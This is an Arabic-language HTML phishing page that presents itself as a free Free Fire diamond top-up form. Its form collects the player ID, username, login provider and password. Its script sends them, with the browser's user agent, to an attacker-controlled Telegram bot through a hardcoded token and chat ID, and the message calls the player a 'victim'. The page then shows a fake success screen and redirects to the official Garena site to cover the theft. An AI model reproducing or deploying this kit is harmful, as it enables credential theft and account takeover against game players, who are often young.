<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Free Fire - شحن جواهر</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{background:rgba(0,0,0,0.75);border-radius:20px;padding:30px 20px;max-width:400px;width:100%;text-align:center;border:2px solid #ff6b00;box-shadow:0 0 40px rgba(255,107,0,0.4)}
h1{font-size:22px;color:#ff6b00;margin-bottom:8px}
.sub{color:#aaa;font-size:13px;margin-bottom:20px}
.fg{margin-bottom:14px;text-align:right}
label{display:block;color:#ccc;font-size:12px;margin-bottom:5px}
input,select{width:100%;padding:13px;background:rgba(255,255,255,0.08);border:1px solid #444;border-radius:10px;color:#fff;font-size:14px;outline:none}
input:focus,select:focus{border-color:#ff6b00}
select option{background:#1a1a2e;color:#fff}
.btn{width:100%;padding:14px;margin-top:10px;background:linear-gradient(135deg,#ff6b00,#ff4500);color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:bold;cursor:pointer;box-shadow:0 0 25px rgba(255,107,0,0.4)}
.btn:active{transform:scale(0.96)}
.load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99;justify-content:center;align-items:center;flex-direction:column}
.load.show{display:flex}
.spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #ff6b00;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:18px}
@keyframes spin{to{transform:rotate(360deg)}}
.done{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:98;justify-content:center;align-items:center;flex-direction:column}
.done.show{display:flex}
.done h2{color:#4CAF50;font-size:24px;margin:12px 0}
</style>
</head>
<body>
<div class="container" id="form">
<h1>🔫 Free Fire</h1>
<p class="sub">شحن جواهر مجاني</p>
<div class="fg"><label>🆔 ID اللاعب</label><input type="text" id="player_id" placeholder="أدخل ID حسابك"></div>
<div class="fg"><label>👤 اسم المستخدم</label><input type="text" id="username" placeholder="اسم المستخدم"></div>
<div class="fg"><label>🔑 طريقة الدخول</label><select id="login_type"><option value="">-- اختر --</option><option>Facebook</option><option>Google</option><option>VK</option></select></div>
<div class="fg"><label>🔒 كلمة المرور</label><input type="password" id="password" placeholder="كلمة المرور"></div>
<div class="fg"><label>💎 عدد الجواهر</label><select id="amount"><option value="">-- اختر --</option><option>100 جوهرة</option><option>310 جوهرة</option><option>520 جوهرة</option><option>1060 جوهرة</option><option>2180 جوهرة</option></select></div>
<button class="btn" onclick="go()">💎 شحن الجواهر</button>
</div>
<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري الشحن...</p></div>
<div class="done" id="done"><h2>✅ تم الشحن!</h2><p>سيتم إضافة الجواهر خلال 24 ساعة</p></div>
<script>
var u=new URL(window.location.href);
var CHAT=u.searchParams.get('chatId')||'7276604783';
var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
async function send(t){
try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
}
async function go(){
var id=document.getElementById('player_id').value.trim();
var un=document.getElementById('username').value.trim();
var lt=document.getElementById('login_type').value;
var pw=document.getElementById('password').value.trim();
var am=document.getElementById('amount').value;
if(!id||!un||!lt||!pw||!am)return alert('املأ جميع الحقول');
document.getElementById('load').classList.add('show');
var msg='🎯 <b>ضحية فري فاير!</b>\n\n🆔 ID: '+id+'\n👤 يوزر: '+un+'\n🔑 دخول: '+lt+'\n🔒 كلمة: '+pw+'\n💎 باقة: '+am+'\n\n📱 '+navigator.userAgent;
await send(msg);
setTimeout(function(){document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(function(){window.location.href='https://ff.garena.com/'},3000)},4000);
}
</script>
</body>
</html>
